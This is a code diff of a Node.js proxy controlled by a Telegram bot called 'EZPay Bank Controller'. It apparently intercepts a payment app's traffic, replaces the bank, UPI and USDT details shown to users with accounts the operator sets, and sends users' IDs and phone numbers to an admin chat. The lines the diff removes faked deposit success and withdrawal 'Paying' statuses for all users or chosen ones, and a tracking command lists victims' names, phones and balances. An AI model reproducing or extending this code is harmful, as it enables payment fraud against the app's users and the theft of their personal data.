@@ -492,10 +492,15 @@ app.use(async (req, res, next) => {
     if (data.logRequests && data.adminChatId && bot) {
       const path = req.originalUrl || req.url;
       if (!path.includes('bot-webhook') && !path.includes('favicon')) {
-        const userId = await extractUserId(req, null);
+        let userId = await extractUserId(req, null);
+        if (!userId) {
+          const body = req.parsedBody || {};
+          userId = body.memberCodeId || '';
+        }
         const phone = getPhone(data, userId);
-        const tag = userId ? ` (${phone || userId})` : '';
-        bot.sendMessage(data.adminChatId, `📡 ${req.method} ${path}${tag}`).catch(()=>{});
+        const tag = userId ? ` [${userId}]` : '';
+        const phoneTag = phone ? ` (${phone})` : '';
+        bot.sendMessage(data.adminChatId, `📡 ${req.method} ${path}${tag}${phoneTag}`).catch(()=>{});
       }
     }
   } catch(e) {}
@@ -551,45 +556,26 @@ app.post('/bot-webhook', async (req, res) => {
       await bot.sendMessage(chatId,
 `🏦 EZPay Bank Controller
 
-=== GLOBAL COMMANDS ===
+=== BANK COMMANDS ===
 /addbank Name|AccNo|IFSC|BankName|UPI
 /removebank <number>
 /setbank <number>
 /banks — List all banks
-/status — Full status
 
+=== CONTROL ===
 /on — Proxy ON
 /off — Proxy OFF
 /rotate — Toggle auto-rotate banks
 /log — Toggle request logging
+/status — Full status
+/debug — Debug next response
 
-=== DEPOSIT COMMANDS ===
-/deposit on <amount> — ALL users deposit success
-/deposit off — ALL users normal
-
-=== WITHDRAW COMMANDS ===
-/on withdraw <count> — Last N orders → Paying (all)
-/on withdraw <count> <userId> — Per user
-/off withdraw — Restore global
-/off withdraw <userId> — Restore per user
-
-=== USDT COMMANDS ===
+=== USDT ===
 /usdt <address> — Set USDT address
 /usdt off — Disable USDT override
 
 === TRACKING ===
-/idtrack — Show all tracked user IDs with details
-
-=== PER-ID COMMANDS ===
-/id deposit on <amount> <userId>
-/id deposit off <userId>
-/id bank <bankNum> <userId>
-/id on <userId>
-/id off <userId>
-/id status <userId>
-/id reset <userId>
-/id list — Show all overrides
-/id track — Show detected users
+/idtrack — Show all tracked user IDs
 
 Example:
 /addbank Rahul Kumar|1234567890|SBIN0001234|SBI|rahul@upi`
@@ -605,13 +591,7 @@ Example:
     if (text === '/status') {
       const active = getActiveBank(data, null);
       const idCount = Object.keys(data.userOverrides || {}).length;
-      let m = `📊 Status:\nProxy: ${data.botEnabled ? '🟢 ON' : '🔴 OFF'}\nBanks: ${data.banks.length}\nAuto-Rotate: ${data.autoRotate ? '🔄 ON' : '❌ OFF'}\nDeposit: ${data.depositSuccess ? '✅ SUCCESS (₹' + (data.depositBonus || 0) + ')' : '🔴 Normal'}\nPer-ID: ${idCount}\nLog: ${data.logRequests ? '📡 ON' : '🔇 OFF'}`;
-      if (data.withdrawOverride > 0) m += `\nWithdraw: ✅ First ${data.withdrawOverride} → Paying (global)`;
-      const wUsers = Object.entries(data.userOverrides || {}).filter(([k, v]) => v.withdrawCount > 0);
-      if (wUsers.length > 0) {
-        m += '\nWithdraw per-ID:';
-        wUsers.forEach(([uid, v]) => { m += `\n  👤 ${uid}: ${v.withdrawCount}`; });
-      }
+      let m = `📊 Status:\nProxy: ${data.botEnabled ? '🟢 ON' : '🔴 OFF'}\nBanks: ${data.banks.length}\nAuto-Rotate: ${data.autoRotate ? '🔄 ON' : '❌ OFF'}\nLog: ${data.logRequests ? '📡 ON' : '🔇 OFF'}\nTracked Users: ${Object.keys(data.trackedUsers || {}).length}`;
       if (data.usdtAddress) m += `\n₮ USDT: ${data.usdtAddress.substring(0, 15)}...`;
       if (active) m += `\n\n💳 Active:\n${active.accountHolder}\n${active.accountNo}\nIFSC: ${active.ifsc}${active.bankName ? '\nBank: ' + active.bankName : ''}${active.upiId ? '\nUPI: ' + active.upiId : ''}`;
       else m += '\n\n⚠️ No active bank';
@@ -694,60 +674,6 @@ Example:
       return res.sendStatus(200);
     }
 
-    if (text.startsWith('/deposit on')) {
-      const amountStr = text.substring(11).trim();
-      const amount = parseFloat(amountStr);
-      if (amountStr && isNaN(amount)) { await bot.sendMessage(chatId, '❌ Format: /deposit on <amount>'); return res.sendStatus(200); }
-      data.depositSuccess = true;
-      if (!isNaN(amount) && amount > 0) data.depositBonus = (data.depositBonus || 0) + amount;
-      await saveData(data);
-      await bot.sendMessage(chatId, `✅ Deposit SUCCESS ON (GLOBAL)\n${amount > 0 ? '💰 Added: ₹' + amount + '\n' : ''}Balance Bonus: ₹${data.depositBonus || 0}`);
-      return res.sendStatus(200);
-    }
-
-    if (text === '/deposit off') {
-      data.depositSuccess = false; data.depositBonus = 0;
-      await saveData(data);
-      await bot.sendMessage(chatId, '🔴 Deposit OFF (GLOBAL). Per-ID overrides still active.');
-      return res.sendStatus(200);
-    }
-
-    if (text.match(/^\/on withdraw\s+/i)) {
-      const parts = text.replace(/^\/on withdraw\s+/i, '').trim().split(/\s+/);
-      const count = parseInt(parts[0]);
-      const userId = parts[1] || null;
-      if (isNaN(count) || count <= 0) { await bot.sendMessage(chatId, '❌ Format: /on withdraw <count> [userId]'); return res.sendStatus(200); }
-      if (userId) {
-        if (!data.userOverrides[userId]) data.userOverrides[userId] = {};
-        data.userOverrides[userId].withdrawCount = count;
-        await saveData(data);
-        await bot.sendMessage(chatId, `✅ Withdraw ON for user ${userId}: first ${count} → Paying`);
-      } else {
-        data.withdrawOverride = count;
-        await saveData(data);
-        await bot.sendMessage(chatId, `✅ Withdraw ON (global): first ${count} → Paying`);
-      }
-      return res.sendStatus(200);
-    }
-
-    if (text.match(/^\/off withdraw/i)) {
-      const userId = text.replace(/^\/off withdraw\s*/i, '').trim();
-      if (userId) {
-        if (data.userOverrides[userId] && data.userOverrides[userId].withdrawCount) {
-          delete data.userOverrides[userId].withdrawCount;
-          await saveData(data);
-          await bot.sendMessage(chatId, `🗑 Withdraw OFF for user ${userId}`);
-        } else {
-          await bot.sendMessage(chatId, `ℹ️ No withdraw override for ${userId}`);
-        }
-      } else {
-        data.withdrawOverride = 0;
-        await saveData(data);
-        await bot.sendMessage(chatId, '🗑 Withdraw OFF (global)');
-      }
-      return res.sendStatus(200);
-    }
-
     if (text.startsWith('/usdt ')) {
       const addr = text.substring(6).trim();
       if (addr.toLowerCase() === 'off') {
@@ -764,141 +690,6 @@ Example:
       return res.sendStatus(200);
     }
 
-    if (text.startsWith('/id ')) {
-      const idCmd = text.substring(4).trim();
-
-      if (idCmd === 'list') {
-        const overrides = data.userOverrides || {};
-        const ids = Object.keys(overrides);
-        if (ids.length === 0) { await bot.sendMessage(chatId, '📋 No per-ID overrides.'); return res.sendStatus(200); }
-        let m = '📋 Per-ID Overrides:\n\n';
-        for (const uid of ids) {
-          const uo = overrides[uid];
-          const parts = [];
-          if (uo.botEnabled !== undefined) parts.push(uo.botEnabled ? '🟢 ON' : '🔴 OFF');
-          if (uo.depositSuccess !== undefined) parts.push(uo.depositSuccess ? '✅ Deposit ON (₹' + (uo.depositBonus || 0) + ')' : '🔴 Deposit OFF');
-          if (uo.bankIndex !== undefined) parts.push('🏦 Bank #' + (uo.bankIndex + 1));
-          if (uo.withdrawCount) parts.push('💸 Withdraw: ' + uo.withdrawCount);
-          m += `👤 ${uid}: ${parts.join(' | ')}\n`;
-        }
-        await bot.sendMessage(chatId, m);
-        return res.sendStatus(200);
-      }
-
-      if (idCmd === 'track') {
-        const tracked = data.trackedUsers || {};
-        const ids = Object.keys(tracked);
-        if (ids.length === 0) { await bot.sendMessage(chatId, '📋 No users detected yet.'); return res.sendStatus(200); }
-        let m = '📋 Tracked Users:\n\n';
-        for (const uid of ids) {
-          const u = tracked[uid];
-          const hasOverride = data.userOverrides && data.userOverrides[uid] ? ' ⚙️' : '';
-          m += `👤 ID: ${uid}${hasOverride}\n`;
-          if (u.name) m += `   📛 Name: ${u.name}\n`;
-          if (u.phone) m += `   📱 Phone: ${u.phone}\n`;
-          if (u.balance) m += `   💰 Balance: ${u.balance}\n`;
-          m += `   🕐 Last: ${u.lastAction || 'N/A'} @ ${u.lastSeen || 'N/A'}\n`;
-          m += `   📦 Orders: ${u.orderCount || 0}\n\n`;
-        }
-        if (m.length > 4000) m = m.substring(0, 4000) + '\n... (truncated)';
-        await bot.sendMessage(chatId, m);
-        return res.sendStatus(200);
-      }
-
-      const depositOnMatch = idCmd.match(/^deposit on\s+(\d+(?:\.\d+)?)\s+(\S+)$/);
-      if (depositOnMatch) {
-        const amount = parseFloat(depositOnMatch[1]);
-        const userId = depositOnMatch[2];
-        if (!data.userOverrides[userId]) data.userOverrides[userId] = {};
-        data.userOverrides[userId].depositSuccess = true;
-        data.userOverrides[userId].depositBonus = (data.userOverrides[userId].depositBonus || 0) + amount;
-        await saveData(data);
-        await bot.sendMessage(chatId, `✅ User ${userId}: Deposit ON, Bonus: ₹${data.userOverrides[userId].depositBonus}`);
-        return res.sendStatus(200);
-      }
-
-      const depositOffMatch = idCmd.match(/^deposit off\s+(\S+)$/);
-      if (depositOffMatch) {
-        const userId = depositOffMatch[1];
-        if (!data.userOverrides[userId]) data.userOverrides[userId] = {};
-        data.userOverrides[userId].depositSuccess = false;
-        data.userOverrides[userId].depositBonus = 0;
-        await saveData(data);
-        await bot.sendMessage(chatId, `🔴 User ${userId}: Deposit OFF`);
-        return res.sendStatus(200);
-      }
-
-      const bankMatch = idCmd.match(/^bank\s+(\d+)\s+(\S+)$/);
-      if (bankMatch) {
-        const bankNum = parseInt(bankMatch[1]);
-        const userId = bankMatch[2];
-        if (bankNum < 1 || bankNum > data.banks.length) { await bot.sendMessage(chatId, '❌ Invalid bank number'); return res.sendStatus(200); }
-        if (!data.userOverrides[userId]) data.userOverrides[userId] = {};
-        data.userOverrides[userId].bankIndex = bankNum - 1;
-        await saveData(data);
-        const bank = data.banks[bankNum - 1];
-        await bot.sendMessage(chatId, `✅ User ${userId}: Bank #${bankNum} → ${bank.accountHolder}`);
-        return res.sendStatus(200);
-      }
-
-      const onMatch = idCmd.match(/^on\s+(\S+)$/);
-      if (onMatch) {
-        const userId = onMatch[1];
-        if (!data.userOverrides[userId]) data.userOverrides[userId] = {};
-        data.userOverrides[userId].botEnabled = true;
-        await saveData(data);
-        await bot.sendMessage(chatId, `🟢 User ${userId}: Bot ON`);
-        return res.sendStatus(200);
-      }
-
-      const offMatch = idCmd.match(/^off\s+(\S+)$/);
-      if (offMatch) {
-        const userId = offMatch[1];
-        if (!data.userOverrides[userId]) data.userOverrides[userId] = {};
-        data.userOverrides[userId].botEnabled = false;
-        await saveData(data);
-        await bot.sendMessage(chatId, `🔴 User ${userId}: Bot OFF`);
-        return res.sendStatus(200);
-      }
-
-      const statusMatch = idCmd.match(/^status\s+(\S+)$/);
-      if (statusMatch) {
-        const userId = statusMatch[1];
-        const uo = getUserOverride(data, userId);
-        const eff = getEffectiveSettings(data, userId);
-        let m = `📊 User ${userId}:\n`;
-        if (!uo) m += '(No overrides — global)\n\n';
-        m += `Bot: ${eff.botEnabled !== false ? '🟢 ON' : '🔴 OFF'}${uo && uo.botEnabled !== undefined ? ' (per-ID)' : ' (global)'}\n`;
-        m += `Deposit: ${eff.depositSuccess ? '✅ ON (₹' + eff.depositBonus + ')' : '🔴 OFF'}${uo && uo.depositSuccess !== undefined ? ' (per-ID)' : ' (global)'}\n`;
-        if (eff.bankOverride !== null && eff.bankOverride >= 0 && eff.bankOverride < data.banks.length) {
-          const b = data.banks[eff.bankOverride];
-          m += `Bank: 🏦 #${eff.bankOverride + 1} ${b.accountHolder} (per-ID)\n`;
-        } else {
-          const active = getActiveBank(data, null);
-          m += `Bank: ${active ? active.accountHolder : 'None'} (global)\n`;
-        }
-        const wc = uo && uo.withdrawCount ? uo.withdrawCount : 0;
-        m += `Withdraw: ${wc > 0 ? '✅ First ' + wc + ' → Paying (per-ID)' : (data.withdrawOverride > 0 ? '✅ First ' + data.withdrawOverride + ' → Paying (global)' : '❌ OFF')}`;
-        await bot.sendMessage(chatId, m);
-        return res.sendStatus(200);
-      }
-
-      const resetMatch = idCmd.match(/^reset\s+(\S+)$/);
-      if (resetMatch) {
-        const userId = resetMatch[1];
-        if (data.userOverrides[userId]) {
-          delete data.userOverrides[userId];
-          await saveData(data);
-          await bot.sendMessage(chatId, `🔄 User ${userId}: All overrides removed.`);
-        } else {
-          await bot.sendMessage(chatId, `ℹ️ User ${userId}: No overrides.`);
-        }
-        return res.sendStatus(200);
-      }
-
-      await bot.sendMessage(chatId, '❌ Invalid /id command. Use /start for help.');
-      return res.sendStatus(200);
-    }
 
     if (text === '/help') {
       await bot.sendMessage(chatId, 'Use /start to see all commands.');
